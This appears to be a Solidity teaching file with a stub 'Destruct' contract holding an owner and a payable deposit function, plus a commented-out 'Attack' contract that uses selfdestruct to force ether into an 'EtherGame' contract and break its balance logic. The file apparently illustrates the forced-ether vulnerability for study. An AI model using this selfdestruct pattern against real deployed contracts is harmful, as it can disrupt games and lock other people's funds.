// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


contract Destruct {
    address public owner;

    constructor(){
        owner = msg.sender;
    }

    function deposit() public payable { }
}

/* contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
} */